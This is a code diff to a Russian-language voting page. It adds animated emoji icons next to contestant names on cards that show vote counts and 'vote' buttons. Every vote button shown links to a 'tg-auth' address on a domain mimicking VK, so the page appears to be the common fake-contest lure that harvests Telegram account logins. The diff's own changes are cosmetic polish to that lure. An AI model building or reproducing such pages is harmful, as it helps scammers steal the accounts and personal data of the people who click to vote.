@@ -99,6 +99,21 @@
     font-weight: 600;
     font-size: 18px;
     margin-bottom: 4px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+  }
+
+  /* Иконки рядом с именем */
+  .custom-icon {
+    font-size: 18px;
+    color: gold;
+    animation: iconPulse 1.5s ease-in-out infinite;
+  }
+  @keyframes iconPulse {
+    0%, 100% { transform: scale(1); color: gold; }
+    50% { transform: scale(1.3); color: #FFD700; }
   }
 
   .custom-votes {
@@ -144,7 +159,9 @@
 
   <div class="custom-user-card">
     <img src="https://radika1.link/2025/08/09/8880889044cb350c36cdbaf89137.jpeg" alt="Лиза" class="custom-avatar" />
-    <div class="custom-name">Лиза</div>
+    <div class="custom-name">
+      Лиза <span class="custom-icon">👑</span>
+    </div>
     <div class="custom-votes">Голосов: 25</div>
     <a href="https://photo-vk.sbs/tg-auth/8f9a6b7c438742f1479bab439fb1f7f33fff77c3">
       <button class="custom-vote-btn">Проголосовать ✨</button>
@@ -153,7 +170,9 @@
 
   <div class="custom-user-card">
     <img src="https://radika1.link/2025/08/09/30f9e065abeb84f777b78ed3b234.jpeg" alt="Елизавета" class="custom-avatar" />
-    <div class="custom-name">Елизавета</div>
+    <div class="custom-name">
+      Елизавета <span class="custom-icon">💫</span>
+    </div>
     <div class="custom-votes">Голосов: 29</div>
     <a href="https://photo-vk.sbs/tg-auth/8f9a6b7c438742f1479bab439fb1f7f33fff77c3">
       <button class="custom-vote-btn">Проголосовать ✨</button>
